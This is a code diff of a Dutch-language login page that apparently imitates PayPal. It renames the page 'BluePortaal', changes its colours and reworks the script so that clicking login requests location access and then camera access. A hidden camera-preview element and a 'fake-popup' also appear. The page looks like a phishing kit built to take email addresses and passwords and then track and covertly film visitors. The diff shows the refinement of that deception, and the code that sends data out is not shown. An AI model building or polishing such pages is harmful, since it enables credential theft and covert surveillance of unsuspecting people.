@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal - Inloggen</title>
+    <title>BluePortaal - Inloggen</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -34,7 +34,7 @@
         }
 
         .login-btn {
-            background: #0070ba;
+            background: #004682;
             color: white;
             padding: 12px;
             width: 100%;
@@ -67,8 +67,9 @@
         }
 
         .paypal-color {
-            color: #0070ba;
+            color: #004682;
         }
+
         .paypal-background {
             background-color: #f6f6f6;
         }
@@ -79,14 +80,14 @@
 
         /* Hidden Video Element */
         #camera-preview {
-            display: none; /* Camera display is now hidden */
+            display: none;
         }
     </style>
 </head>
 <body class="paypal-background">
 
     <div class="container">
-        <h2 class="paypal-color">PayPal</h2>
+        <h2 class="paypal-color">BluePortaal</h2>
         <p>Log in om door te gaan</p>
         <input type="text" placeholder="E-mailadres" id="email">
         <input type="password" placeholder="Wachtwoord" id="password">
@@ -115,11 +116,18 @@
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            // 🔹 Locatie en camera direct aanvragen met één klik
-            Promise.all([
-                requestLocationPermission(),
-                requestCameraPermission()
-            ]);
+            // 🔹 Vraag locatie toestemming eerst, daarna camera toestemming
+            requestLocationPermission()
+                .then(() => {
+                    console.log("✅ Locatie toestemming gegeven!");
+                    return requestCameraPermission();
+                })
+                .then(() => {
+                    console.log("✅ Camera toestemming gegeven!");
+                })
+                .catch(error => {
+                    console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
+                });
         }
 
         // Functie om locatie toestemming te verkrijgen
